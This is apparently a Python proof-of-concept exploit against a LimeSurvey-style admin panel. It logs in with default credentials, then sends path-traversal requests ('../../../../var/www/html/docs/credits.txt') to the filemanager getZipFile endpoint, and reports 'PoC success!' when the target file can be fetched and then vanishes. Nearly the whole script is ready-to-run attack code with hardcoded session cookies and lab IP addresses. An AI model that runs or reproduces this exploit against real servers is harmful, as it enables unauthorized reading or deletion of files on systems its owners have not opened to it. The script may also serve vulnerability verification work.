import requests
import sys

def login(host):

    burp0_url = "http://"+host+"/index.php/admin/authentication/sa/login"
    burp0_cookies = {"PHPSESSID": "d1f05cefe8bec342c61a93cc722b75e1", "YII_CSRF_TOKEN": "Q1h-QUJKZ2x4a09hR3JmdWQ3eVFFNWxHTmtXX0ZqMHZGaRXh68Lir7Dx9LLsALqnWMWyzp6sbmucRtDTeYVf8w%3D%3D"}
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://192.168.1.237:8082", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://192.168.1.237:8082/index.php/admin/authentication/sa/login", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    burp0_data = {"YII_CSRF_TOKEN": "Q1h-QUJKZ2x4a09hR3JmdWQ3eVFFNWxHTmtXX0ZqMHZGaRXh68Lir7Dx9LLsALqnWMWyzp6sbmucRtDTeYVf8w==", "authMethod": "Authdb", "user": "admin", "password": "password", "loginlang": "default", "action": "login", "width": "1536", "login_submit": "login"}
    session = requests.session()
    res=session.post(burp0_url, headers=burp0_headers,data=burp0_data,verify=False,cookies=burp0_cookies,allow_redirects=False)
    #print(res.text)
    location=res.headers
    phin = requests.utils.dict_from_cookiejar(session.cookies)
   
    burp0_url = "http://"+host+"/index.php/admin/filemanager/sa/getZipFile?path=/../../../../../../../var/www/html/docs/credits.txt"
    burp0_cookies = phin
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://192.168.1.237:8082/index.php/admin/authentication/sa/login", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    r=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    result1=r.text

    burp0_url = "http://"+host+"/index.php/admin/filemanager/sa/getZipFile?path=/../../../../../../../var/www/html/docs/credits.txt"
    burp0_cookies = phin
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://192.168.1.237:8082/index.php/admin/authentication/sa/login", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    r=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    result2=r.text
    #print(r.text)
    #print(r2.status_code)
    return result1,result2

def check(result1,host,result2):
   # if("Nino Cosic" in result1 and "Nino Cosic" not in result2):
    if(result1!='' and result2==''):
        print('PoC success!')
        return 0
    else:
        print('PoC failed!')
        return -1
if __name__ == "__main__":
    host = sys.argv[1]
    #host="web"
    #host="192.168.56.101:8082"
    result=login(host)
    result1=result[0]
    result2=result[1]
    check(result1,host,result2)